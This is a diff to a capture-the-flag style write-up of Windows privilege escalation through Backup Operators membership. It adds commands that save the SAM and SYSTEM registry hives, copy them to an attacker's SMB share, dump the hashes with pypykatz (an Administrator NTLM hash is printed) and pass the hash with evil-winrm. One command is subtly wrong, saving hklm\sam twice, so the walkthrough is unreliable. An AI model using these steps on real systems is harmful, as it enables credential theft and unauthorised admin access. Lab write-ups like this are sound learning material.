@@ -180,5 +180,43 @@ EMILY --> ADMIN
 --
 i was stuck here for a bit since im not very good at windows priv esc yet, but after doing some of the basic checks i noticed i was in the "backup operators" group, and i knew from my studying this could be a powerfull positsion to be in  
 so i checked out hacktricks
-[HackTrickz Privilaged Groups](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)
+[Hacktricks Privileged Groups](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)  
 
+        Membership in the Backup Operators group provides access to the DC01 file system due to the SeBackup and SeRestore privileges. These privileges 
+        enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the FILE_FLAG_BACKUP_SEMANTICS flag. 
+        Utilizing specific scripts is necessary for this process.
+so after reading i copied SAM and SYSTEM since i couldnt access NTDS.DIS, but SAM still holds the local account hashes like admin guest ect
+
+**reg save hklm\sam c:\Users\emily.carlos\sam**
+**reg save hklm\sam c:\Users\emily.carlos\system**
+
+and i succesfully saved them, now all i needed to do was extract these files then use something like secretsdump, mimikatz, pypykatz ect
+
+
+        ON ATTACKER MACHINE
+        impacket-smbserver share $(pwd) -smb2support
+
+        ON WINDOWS MACHINE
+        copy sam \\10.10.16.13\share\sam
+        copy system \\10.10.16.13\share\system
+it worked, now i can just dump the hashes
+
+**pypykatz registry --sam sam system**
+
+        ============== SYSTEM hive secrets ==============
+        CurrentControlSet: ControlSet001
+        Boot Key: 3c2b033757a49110a9ee680b46e8d620
+        ============== SAM hive secrets ==============
+        HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+Now using WinRM i can just use the admins NTML Hashs, in a pass the hash attack to get access
+
+**evil-winrm -i $ip -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341**
+
+and it worked! i succesfully got root.txt
+
+        
